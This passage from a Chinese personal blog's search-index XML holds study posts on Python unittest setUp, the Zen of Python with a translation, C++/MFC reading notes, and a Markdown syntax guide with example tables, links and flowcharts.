做了两件事情：创建一个调查对象（见❶）；创建一个答案列表（见❷）。存储这两样东西的变量名包含前缀self （即存储在属性中），因此可在这个类的任何地方使用。这让两个测试方法都更简单，因为它们都不用创建调查对象和答案。方法test_store_three_response() 核实self.responses 中的第一个答案——self.responses[0] ——被妥善地存储，而方法test_store_three_response() 核实self.responses 中的全部三个答案都被妥善地存储。<br>再次运行test_survey.py时，这两个测试也都通过了。如果要扩展AnonymousSurvey ，使其允许每位用户输入多个答案，这些测试将很有用。修改代码以接受多个答案后，可运行这些测试，确认存储单个答案或一系列答案的行为未受影响。<br>测试自己编写的类时，方法setUp() 让测试方法编写起来更容易：可在setUp() 方法中创建一系列实例并设置它们的属性，再在测试方法中直接使用这些实例。相比于在每个测试方法中都创建实例并设置其属性，这要容易得多。<br><strong>注意</strong>运行测试用例时，每完成一个单元测试，Python都打印一个字符：测试通过时打印一个句点；测试引发错误时打印一个E ；测试导致断言失败时打印一个F 。<br>这就是你运行测试用例时，在输出的第一行中看到的句点和字符数量各不相同的原因。如果测试用例包含很多单元测试，需要运行很长时间，就可通过观察这些结果来获悉有多少个测试通过了。</p><p>　</p>]]></content>
      
      <categories>
          
          <category> Python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Python </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Python之禅</title>
      <link href="/2018/11/10/Python%E4%B9%8B%E7%A6%85/"/>
      <url>/2018/11/10/Python%E4%B9%8B%E7%A6%85/</url>
      <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>Python之禅<br><a id="more"></a></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; import this</span><br><span class="line">The Zen of Python, by Tim Peters</span><br><span class="line"></span><br><span class="line">Beautiful is better than ugly.</span><br><span class="line">Explicit is better than implicit.</span><br><span class="line">Simple is better than complex.</span><br><span class="line">Complex is better than complicated.</span><br><span class="line">Flat is better than nested.</span><br><span class="line">Sparse is better than dense.</span><br><span class="line">Readability counts.</span><br><span class="line">Special cases aren&apos;t special enough to break the rules.</span><br><span class="line">Although practicality beats purity.</span><br><span class="line">Errors should never pass silently.</span><br><span class="line">Unless explicitly silenced.</span><br><span class="line">In the face of ambiguity, refuse the temptation to guess.</span><br><span class="line">There should be one-- and preferably only one --obvious way to do it.</span><br><span class="line">Although that way may not be obvious at first unless you&apos;re Dutch.</span><br><span class="line">Now is better than never.</span><br><span class="line">Although never is often better than *right* now.</span><br><span class="line">If the implementation is hard to explain, it&apos;s a bad idea.</span><br><span class="line">If the implementation is easy to explain, it may be a good idea.</span><br><span class="line">Namespaces are one honking great idea -- let&apos;s do more of those!</span><br></pre></td></tr></table></figure><p>翻译和解释:</p><blockquote><p>python<br>Python之禅 by Tim Peters<br>优美胜于丑陋（Python 以编写优美的代码为目标）<br>明了胜于晦涩（优美的代码应当是明了的，命名规范，风格相似）<br>简洁胜于复杂（优美的代码应当是简洁的，不要有复杂的内部实现）<br>复杂胜于凌乱（如果复杂不可避免，那代码间也不能有难懂的关系，要保持接口简洁）<br>扁平胜于嵌套（优美的代码应当是扁平的，不能有太多的嵌套）<br>间隔胜于紧凑（优美的代码有适当的间隔，不要奢望一行代码解决问题）<br>可读性很重要（优美的代码是可读的）<br>即便假借特例的实用性之名，也不可违背这些规则（这些规则至高无上）<br>不要包容所有错误，除非你确定需要这样做（精准地捕获异常，不写 except:pass 风格的代码）<br>当存在多种可能，不要尝试去猜测<br>而是尽量找一种，最好是唯一一种明显的解决方案（如果不确定，就用穷举法）<br>虽然这并不容易，因为你不是 Python 之父（这里的 Dutch 是指 Guido ）<br>做也许好过不做，但不假思索就动手还不如不做（动手之前要细思量）<br>如果你无法向人描述你的方案，那肯定不是一个好方案；反之亦然（方案测评标准）<br>命名空间是一种绝妙的理念，我们应当多加利用（倡导与号召）</p></blockquote>]]></content>
      
      <categories>
          
          <category> Python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Python </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>C++ &amp;&amp; MFC Research——《C++ 编程思想》</title>
      <link href="/2018/11/06/C++&amp;&amp;%20MFC%20Research/"/>
      <url>/2018/11/06/C++&amp;&amp;%20MFC%20Research/</url>
      <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>补充编程知识，工作学习中用到。<br><a id="more"></a></p><p>学习路线：<br>《C程序设计》——谭浩强 ·清华大学出版社<br>《C++编程思想》——Bruce Eckel·机械工业出版社<br>《Windows程序设计》——Jeff Prosise·清华大学出版社<br>《Visual C++ 权威剖析》——辛长安王颜国·清华大学出版社<br>《深入浅出MFC（第2版）》——侯捷·华中理工大学出版社<br>《Visual C++技术内幕（第4版）》——潘爱民（译）·清华大学出版社</p><p><strong>动态链接库</strong></p><p>创建的动态链接库可以在运行时加载和链接。多个应用程序可以共享动态链接库（DLLs）。动态链接库增加了程序的模块性，因为可以单独编译和测试动态链接库。</p><p><strong>应用程序框架</strong>——提供一个一般应用程序所需要的全部面向对象软件组件的集成集合。</p><p><strong>基础DLL理论</strong></p><p>一般说来，DLL是一个在磁盘上的文件（通常带有DLL扩展），它由全局数据、编辑函数及资源组成成为进程的一个部分。它被编译以加载到首选的基址上。</p><p>《C++ 编程思想》</p><p><strong>public：</strong><br><strong>private：</strong>除了该类别的创建者和该类别的内部成员函数之外，任何人都不能访问这些定义。<br><strong>protect：</strong>与private类似，但是继承的类可以访问<strong>protect</strong>成员，但不能访问<strong>private</strong>成员。</p><p><strong>实现的重用</strong></p><p>OOP的论域就是抽象数据类型、继承和多态性。<br> C++采取的办法是把效率控制<br> 将对象存放在栈中或静态存储区域中，存储和生命周期可以在编程时确定。栈是内存中一个区域，可以直接由微处理器在程序执行期间存放数据。<br>第二种办法是在堆（heap）的区域动态创建对象。<em>new、delete</em></p><p><strong>语言翻译的过程：</strong><br> 从容易理解的形式（源代码）转化成计算机能执行的形式（机器指令）。通常，翻译器分为两类：<em>解释器</em>（interpreter）和<em>编译器</em>（compiler）。</p><p><strong>编译过程：</strong></p><ol><li>对源代码执行预处理。<strong><em>预处理器</em></strong>（preprocessor）是用程序员（利用预处理器指令）定义好的模式代替源代码中的模式。预处理指令来节省输入，增加代码的可读性。预处理过的代码通常存放在一个中间文件中。</li><li>编译一般分两遍：<br>a. 首先对预处理过的代码进行语法分析。有时候，在编译的第一遍和第二遍之间使用全局优化器（global optimizer）来生成更短更快的代码。<br>b. 编译的第二遍，由代码生成器（code generator）遍历语法分析树，把树的每个节点转化成汇编语言或机器代码。最后生成目标模块（通常是，一个以.o或.obj为扩展名的文件）。有时也会在第二遍中使用窥孔优化器（peephole optimizer）从相邻一段代码中查找冗余汇编语句。</li></ol><p><strong>连接器：</strong>把一组目标模块连接成为一个可执行程序，操作系统可以装载和运行它。连接器能搜索称为“库”的特殊文件来处理它所有的应用，库将一组目标模块包含在一个文件中。库由一个被称为<strong>库管理器（librarian）</strong>的程序来创建和维护。<br><strong>静态类型检查：</strong>是编译器在第一遍中完成的。类型检查是检查函数是否争取无法使用，以防止许多程序设计的错误。<br><strong>分段编译工具</strong></p><p><strong>声明（declaration）和定义（definition）区别：</strong></p><p>声明是向编译器介绍名字——标识符。（它告诉编译器“这个函数或这个变量在某处可找到，它的模样像什么”。）<br>定义是在说：“在这里建立变量”或“在这里建立函数”。它为名字分配存储空间。</p><p><strong>包含头文件：</strong>大部分的库包含众多头文件，当堆喝血函数变量做外部声明时，C/C++使用“头文件”（header file）。头文件是一个包含某个库的外部声明函数和变量的文件。<br><strong>&lt; &gt;：</strong>预处理器是以特定方式来寻找为了将，一般是环境中或编译器命令行指定的某种寻找路径。<br><strong>“ ”：</strong>预处理器以“由实现定义的方式”来寻找文件。它通常是从当前目录开始寻找，如果文件没找到，那么include命令就按与尖括号同样的方式重新开始寻找。</p><p><strong>使用库文件：</strong><br>必须：<br>1）包含库的头文件<br>2）使用库中函数<br>3）把库连接进可执行程序</p><p><strong>名字空间：</strong>namespace关键字，库或程序中每一个C++定义集被封装在一个名字空间中，如果其他的定义中有相同的名字，但它们在不同的名字空间，就不会产生冲突。</p><p>C++库的“容器”与“算法”和被称为STL的东西混淆。<br>STL（标准模板类库，Standard Template Library）</p><p>vector类似一个模板（template），也就是说它可以用于不同类型。可以创建Shape的vector、Cat的vector和String的vector等。用模板几乎可以创建“任何事物的类”。把类型名输入到尖括号内，让编译器知道vector所用的类（在这种情况下就是vector将要保存的类）。所以，string的vector表示为vector<string>。这样，就定制了只装string对象的vector。</string></p><p>把东西放入取出容器的办法，为了在vector末尾后追加一个新元素，可以使用成员函数push_back()（注意，对于一个具体对象要使用“.”来调用它的成员函数）。</p>]]></content>
      
      <categories>
          
          <category> C++ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Study </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>markdown编辑技巧</title>
      <link href="/2018/10/25/markdown%E7%BC%96%E8%BE%91%E6%8A%80%E5%B7%A7/"/>
      <url>/2018/10/25/markdown%E7%BC%96%E8%BE%91%E6%8A%80%E5%B7%A7/</url>
      <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><a id="more"></a><p>[TOC]</p><h1 id="标题"><a href="#标题" class="headerlink" title="标题"></a>标题</h1><p>而在 Markdown 中，你只需要在文本前面加上 <code>#</code> 即可，同理、你还可以增加二级标题、三级标题、四级标题、五级标题和六级标题，总共六级，只需要增加 <code>#</code> 即可，标题字号相应降低。 </p><h1 id="一级标题"><a href="#一级标题" class="headerlink" title="一级标题"></a>一级标题</h1><h2 id="二级标题"><a href="#二级标题" class="headerlink" title="二级标题"></a>二级标题</h2><h3 id="三级标题"><a href="#三级标题" class="headerlink" title="三级标题"></a>三级标题</h3><h4 id="四级标题"><a href="#四级标题" class="headerlink" title="四级标题"></a>四级标题</h4><h5 id="五级标题"><a href="#五级标题" class="headerlink" title="五级标题"></a>五级标题</h5><h6 id="六级标题"><a href="#六级标题" class="headerlink" title="六级标题"></a>六级标题</h6><h1 id="列表"><a href="#列表" class="headerlink" title="列表"></a>列表</h1><p>列表格式也很常用，在 Markdown 中，你只需要在文字前面加上 <code>-</code> 就可以了，例如： </p><ul><li><p>文本1</p></li><li><p>文本2</p></li><li><p>文本3</p></li></ul><ol><li>文本1</li><li>文本2</li><li>文本3</li></ol><h1 id="链接和图片"><a href="#链接和图片" class="headerlink" title="链接和图片"></a>链接和图片</h1><p>在 Markdown 中，插入链接不需要其他按钮，你只需要使用 <code>[显示文本](链接地址)</code> 这样的语法即可，例如：</p><p>在 Markdown 中，插入图片不需要其他按钮，你只需要使用 <code>![](图片链接地址)</code> 这样的语法即可，例如：</p><h1 id="引用"><a href="#引用" class="headerlink" title="引用"></a>引用</h1><p>在我们写作的时候经常需要引用他人的文字，这个时候引用这个格式就很有必要了，在 Markdown 中，你只需要在你希望引用的文字前面加上 <code>&gt;</code> 就好了， </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">`n`</span><br></pre></td></tr></table></figure><p><code>n</code></p><h1 id="粗体和斜体"><a href="#粗体和斜体" class="headerlink" title="粗体和斜体"></a>粗体和斜体</h1><p>Markdown 的粗体和斜体也非常简单，用两个 <code>*</code> 包含一段文本就是粗体的语法，用一个 <code>*</code> 包含一段文本就是斜体的语法。 </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">**的和我和文化**</span><br><span class="line">*的和我和文化*</span><br></pre></td></tr></table></figure><p><strong>的和我和文化</strong>  </p><p><em>的和我和文化</em></p><h1 id="代码引用"><a href="#代码引用" class="headerlink" title="代码引用"></a>代码引用</h1><p>需要引用代码时，如果引用的语句只有一段，不分行，可以用 ` 将语句包起来。<br>如果引用的语句为多行，可以将```置于这段代码的首行和末行</p><h1 id="表格"><a href="#表格" class="headerlink" title="表格"></a>表格</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">| Tables        | Are           | Cool  |</span><br><span class="line">| ------------- |:-------------:| -----:|</span><br><span class="line">| col 3 is      | right-aligned | $1600 |</span><br><span class="line">| col 2 is      | centered      |   $12 |</span><br><span class="line">| zebra stripes | are neat      |    $1 |</span><br></pre></td></tr></table></figure><div class="table-container"><table><thead><tr><th>Tables</th><th style="text-align:center">Are</th><th style="text-align:right">Cool</th></tr></thead><tbody><tr><td>col 3 is</td><td style="text-align:center">right-aligned</td><td style="text-align:right">$1600</td></tr><tr><td>col 2 is</td><td style="text-align:center">centered</td><td style="text-align:right">$12</td></tr><tr><td>zebra stripes</td><td style="text-align:center">are neat</td><td style="text-align:right">$1</td></tr></tbody></table></div><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">dog | bird | cat</span><br><span class="line">----|------|----</span><br><span class="line">foo | foo  | foo</span><br><span class="line">bar | bar  | bar</span><br><span class="line">baz | baz  | baz</span><br></pre></td></tr></table></figure><div class="table-container"><table><thead><tr><th>dog</th><th>bird</th><th>cat</th></tr></thead><tbody><tr><td>foo</td><td>foo</td><td>foo</td></tr><tr><td>bar</td><td>bar</td><td>bar</td></tr><tr><td>baz</td><td>baz</td><td>baz</td></tr></tbody></table></div><h1 id="显示链接中带括号的图片"><a href="#显示链接中带括号的图片" class="headerlink" title="显示链接中带括号的图片"></a>显示链接中带括号的图片</h1><p><img src="http://www.google.com" alt="" title="Google"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">* * *</span><br><span class="line"></span><br><span class="line">***</span><br><span class="line"></span><br><span class="line">*****</span><br><span class="line"></span><br><span class="line">- - -</span><br><span class="line"></span><br><span class="line">---------------------------------------</span><br></pre></td></tr></table></figure><hr><hr><hr><hr><hr><p>This is <a href="http://example.com/" title="Title" target="_blank" rel="noopener">an example</a> inline link.</p><p><a href="http://example.net/" target="_blank" rel="noopener">This link</a> has no title attribute.</p><h1 id="MarkDown-图片大小问题"><a href="#MarkDown-图片大小问题" class="headerlink" title="MarkDown 图片大小问题"></a>MarkDown 图片大小问题</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">![lena](markdown编辑技巧/aa.jpg)</span><br></pre></td></tr></table></figure><p><img src="/2018/10/25/markdown编辑技巧/aa.jpg" alt="lena"> </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=&quot;markdown编辑技巧/aa.jpg&quot; width=128 height=128 /&gt;</span><br></pre></td></tr></table></figure><p><img src="/2018/10/25/markdown编辑技巧/aa.jpg" width="256" height="/"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=&quot;markdown编辑技巧/aa.jpg&quot; width=&quot;50%&quot; height=&quot;50%&quot; /&gt;</span><br></pre></td></tr></table></figure><p><img src="/2018/10/25/markdown编辑技巧/aa.jpg" width="50%" height="50%"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;center&gt;</span><br><span class="line">&lt;img src=&quot;markdown编辑技巧/aa.jpg&quot; width=&quot;25%&quot; height=&quot;25%&quot; /&gt;</span><br><span class="line">Figure 1. Lena</span><br><span class="line">&lt;/center&gt;</span><br></pre></td></tr></table></figure><center><img src="/2018/10/25/markdown编辑技巧/aa.jpg" width="25%" height="25%">Figure 1. Lena</center><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$$</span><br><span class="line">y=\begin&#123;cases&#125;</span><br><span class="line">-x,\quad x\leq 0\\</span><br><span class="line">x, \quad x&gt;0</span><br><span class="line">\end&#123;cases&#125;</span><br><span class="line">$$</span><br></pre></td></tr></table></figure><script type="math/tex; mode=display">y=\begin{cases}-x,\quad x\leq 0\\x, \quad x>0\end{cases}</script><h1 id="斜体和粗体"><a href="#斜体和粗体" class="headerlink" title="斜体和粗体"></a>斜体和粗体</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1. *斜体*或_斜体_</span><br><span class="line">2. **粗体**</span><br><span class="line">3. ***加粗斜体***</span><br><span class="line">4. ~~删除线~~</span><br></pre></td></tr></table></figure><ol><li><em>斜体</em>或<em>斜体</em></li><li><strong>粗体</strong></li><li><strong><em>加粗斜体</em></strong></li><li><del>删除线</del></li></ol><h1 id="超链接"><a href="#超链接" class="headerlink" title="超链接"></a>超链接</h1><p>Markdown 支持两种形式的链接语法： 行内式和参考式两种形式，行内式一般使用较多。</p><h3 id="3-1-行内式"><a href="#3-1-行内式" class="headerlink" title="3.1. 行内式"></a>3.1. 行内式</h3><p>语法说明：</p><ul><li>[]里写链接文字，()里写链接地址， ()中的”“中可以为链接指定title属性，title属性可加可不加。title属性的效果是鼠标悬停在链接上会出现指定的 title文字。<a href="链接地址 “链接标题”">链接文字</a>’这样的形式。链接地址与链接标题前有一个空格。</li></ul><p>代码：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1. 欢迎来到[梵居闹市](http://blog.leanote.com/freewalk)</span><br><span class="line"></span><br><span class="line">2. 欢迎来到[梵居闹市](http://blog.leanote.com/freewalk &quot;梵居闹市&quot;)</span><br></pre></td></tr></table></figure></p><p>显示效果：</p><ol><li><p>欢迎来到<a href="http://blog.leanote.com/freewalk" target="_blank" rel="noopener">梵居闹市</a></p></li><li><p>欢迎来到<a href="http://blog.leanote.com/freewalk" title="梵居闹市" target="_blank" rel="noopener">梵居闹市</a></p></li></ol><h3 id="3-2-参考式"><a href="#3-2-参考式" class="headerlink" title="3.2. 参考式"></a>3.2. 参考式</h3><p>参考式超链接一般用在学术论文上面，或者另一种情况，如果某一个链接在文章中多处使用，那么使用引用 的方式创建链接将非常好，它可以让你对链接进行统一的管理。</p><p>语法说明：<br>参考式链接分为两部分，文中的写法 [链接文字][链接标记]，在文本的任意位置添加[链接标记]:链接地址 “链接标题”，链接地址与链接标题前有一个空格。</p><p>如果链接文字本身可以做为链接标记，你也可以写成[链接文字][]<br>[链接文字]：链接地址的形式，见代码的最后一行。</p><p>代码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">1.我经常去的几个网站[Google][1]、[Leanote][2]以及[自己的博客][3]</span><br><span class="line">2. [Leanote 笔记][2]是一个不错的[网站][]。</span><br><span class="line">3.</span><br><span class="line">4. [1]:http://www.google.com &quot;Google&quot;</span><br><span class="line">5. [2]:http://www.leanote.com &quot;Leanote&quot;</span><br><span class="line">6. [3]:http://http://blog.leanote.com/freewalk &quot;梵居闹市&quot;</span><br><span class="line">7. [网站]:http://http://blog.leanote.com/freewalk</span><br></pre></td></tr></table></figure><p>我经常去的几个网站<a href="http://www.google.com" title="Google" target="_blank" rel="noopener">Google</a>、<a href="http://www.leanote.com" title="Leanote" target="_blank" rel="noopener">Leanote</a>以及<a href="http://http://blog.leanote.com/freewalk" title="梵居闹市" target="_blank" rel="noopener">自己的博客</a><br><a href="http://www.leanote.com" title="Leanote" target="_blank" rel="noopener">Leanote 笔记</a>是一个不错的<a href="http://http://blog.leanote.com/freewalk" target="_blank" rel="noopener">网站</a>。</p><h3 id="3-3-自动链接"><a href="#3-3-自动链接" class="headerlink" title="3.3. 自动链接"></a>3.3. 自动链接</h3><p>语法说明：<br>Markdown 支持以比较简短的自动链接形式来处理网址和电子邮件信箱，只要是用\&lt;>包起来， Markdown 就会自动把它转成链接。一般网址的链接文字就和链接地址一样，例如：</p><p>代码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1. &lt;http://example.com/&gt;</span><br><span class="line">2. &lt;address@example.com&gt;</span><br></pre></td></tr></table></figure><p>显示效果：</p><p><a href="http://example.com/" target="_blank" rel="noopener">http://example.com/</a> <a href="mailto:address@example.com" target="_blank" rel="noopener">address@example.com</a></p><h1 id="锚点"><a href="#锚点" class="headerlink" title="锚点"></a>锚点</h1><p>网页中，锚点其实就是页内超链接，也就是链接本文档内部的某些元素，实现当前页面中的跳转。比如我这里写下一个锚点，点击回到目录，就能跳转到目录。 在目录中点击这一节，就能跳过来。还有下一节的注脚。这些根本上都是用锚点来实现的。</p><p>注意： </p><ol><li>Markdown Extra 只支持在标题后插入锚点，其它地方无效。 </li><li>Leanote 编辑器右侧显示效果区域暂时不支持锚点跳转，所以点来点去发现没有跳转不必惊慌，但是你发布成笔记或博文后是支持跳转的。</li></ol><p>语法描述： </p><p>在你准备跳转到的指定标题后插入锚点&#123;#标记 &#125;，然后在文档的其它地方写上连接到锚点的链接。</p><p>代码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1. ## 0. 目录&#123;#index&#125;</span><br><span class="line">2. </span><br><span class="line">3. 跳转到[目录](#index)</span><br></pre></td></tr></table></figure><p>显示效果：</p><h2 id="目录-123-123-125"><a href="#目录-123-123-125" class="headerlink" title="目录&#123;#123&#125;"></a>目录&#123;#123&#125;</h2><p>跳转到<a href="#123">目录</a></p><h3 id="定义型列表"><a href="#定义型列表" class="headerlink" title="定义型列表"></a>定义型列表</h3><p>语法说明：<br>定义型列表由名词和解释组成。一行写上定义，紧跟一行写上解释。解释的写法：紧跟一个缩进&#40; Tab &#41;</p><p>代码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">1. Markdown</span><br><span class="line">2. :    轻量级文本标记语言，可以转换成html，pdf等格式（左侧和四个不可见的空格）</span><br><span class="line">3. </span><br><span class="line">4. 代码块 2</span><br><span class="line">5. :   这是代码块的定义（左侧四个不可见的空格）</span><br><span class="line">6. </span><br><span class="line">7.         代码块（左侧有八个不可见的空格）</span><br></pre></td></tr></table></figure><p>Markdown<br>​    轻量级文本标记语言，可以转换成html，pdf等格式（左侧有一个可见的冒号和四个不可见的空格）</p><p>代码块 2<br>​    这是代码块的定义（左侧有一个可见的冒号和四个不可见的空格）</p><pre><code>    代码块（左侧有八个不可见的空格）</code></pre><h1 id="注脚"><a href="#注脚" class="headerlink" title="注脚"></a>注脚</h1><p>语法说明：</p><p>在需要添加注脚的文字后加上脚注名字<sup><a href="#fn_注脚名字" id="reffn_注脚名字">注脚名字</a></sup>,称为加注。 然后在文本的任意位置(一般在最后)添加脚注，脚注前必须有对应的脚注名字。</p><p>注意：经测试注脚与注脚之间必须空一行，不然会失效。成功后会发现，即使你没有把注脚写在文末，经Markdown转换后，也会自动归类到文章的最后。</p><p>代码：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">1. 使用 Markdown[^1]可以效率的书写文档, 直接转换成 HTML[^2], 你可以使用 Leanote[^Le] 编辑器进行书写。</span><br><span class="line">2. </span><br><span class="line">3. [^1]: Markdown是一种纯文本标记语言</span><br><span class="line">4. </span><br><span class="line">5. [^2]: HyperText Markup Language 超文本标记语言</span><br><span class="line">6.</span><br><span class="line">7. [^Le]: 开源笔记平台，支持Markdown和笔记直接发为博文</span><br></pre></td></tr></table></figure></p><p>显示效果：</p><p>使用 Markdown<sup><a href="#fn_1" id="reffn_1">1</a></sup>可以效率的书写文档, 直接转换成 HTML<sup><a href="#fn_2" id="reffn_2">2</a></sup>, 你可以使用 Leanote<sup><a href="#fn_Le" id="reffn_Le">Le</a></sup> 编辑器进行书写。</p><blockquote id="fn_1"><sup>1</sup>. Markdown是一种纯文本标记语言<a href="#reffn_1" title="Jump back to footnote [1] in the text."> &#8617;</a></blockquote><blockquote id="fn_2"><sup>2</sup>. HyperText Markup Language 超文本标记语言<a href="#reffn_2" title="Jump back to footnote [2] in the text."> &#8617;</a></blockquote><blockquote id="fn_Le"><sup>Le</sup>. 开源笔记平台，支持Markdown和笔记直接发为博文<a href="#reffn_Le" title="Jump back to footnote [Le] in the text."> &#8617;</a></blockquote><p>注：脚注自动被搬运到最后面，请到文章末尾查看，并且脚注后方的链接可以直接跳转回到加注的地方。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">st=&gt;start: Start</span><br><span class="line">op=&gt;operation: Your Operation</span><br><span class="line">cond=&gt;condition: Yes or No?</span><br><span class="line">e=&gt;end</span><br><span class="line">st-&gt;op-&gt;cond</span><br><span class="line">cond(yes)-&gt;e</span><br><span class="line">cond(no)-&gt;op</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">st=&gt;start: Start|past:&gt;http://www.google.com[blank]</span><br><span class="line">e=&gt;end: End:&gt;http://www.google.com</span><br><span class="line">op1=&gt;operation: get_hotel_ids|past</span><br><span class="line">op2=&gt;operation: get_proxy|current</span><br><span class="line">sub1=&gt;subroutine: get_proxy|current</span><br><span class="line">op3=&gt;operation: save_comment|current</span><br><span class="line">op4=&gt;operation: set_sentiment|current</span><br><span class="line">op5=&gt;operation: set_record|current</span><br><span class="line"></span><br><span class="line">cond1=&gt;condition: ids_remain空?</span><br><span class="line">cond2=&gt;condition: proxy_list空?</span><br><span class="line">cond3=&gt;condition: ids_got空?</span><br><span class="line">cond4=&gt;condition: 爬取成功??</span><br><span class="line">cond5=&gt;condition: ids_remain空?</span><br><span class="line"></span><br><span class="line">io1=&gt;inputoutput: ids-remain</span><br><span class="line">io2=&gt;inputoutput: proxy_list</span><br><span class="line">io3=&gt;inputoutput: ids-got</span><br><span class="line"></span><br><span class="line">st-&gt;op1(right)-&gt;io1-&gt;cond1</span><br><span class="line">cond1(yes)-&gt;sub1-&gt;io2-&gt;cond2</span><br><span class="line">cond2(no)-&gt;op3</span><br><span class="line">cond2(yes)-&gt;sub1</span><br><span class="line">cond1(no)-&gt;op3-&gt;cond4</span><br><span class="line">cond4(yes)-&gt;io3-&gt;cond3</span><br><span class="line">cond4(no)-&gt;io1</span><br><span class="line">cond3(no)-&gt;op4</span><br><span class="line">cond3(yes, right)-&gt;cond5</span><br><span class="line">cond5(yes)-&gt;op5</span><br><span class="line">cond5(no)-&gt;cond3</span><br><span class="line">op5-&gt;e</span><br></pre></td></tr></table></figure><h1 id="任务列表"><a href="#任务列表" class="headerlink" title="任务列表"></a>任务列表</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">这是文字……</span><br><span class="line"></span><br><span class="line">- [x] 选项一</span><br><span class="line">- [ ] 选项二  </span><br><span 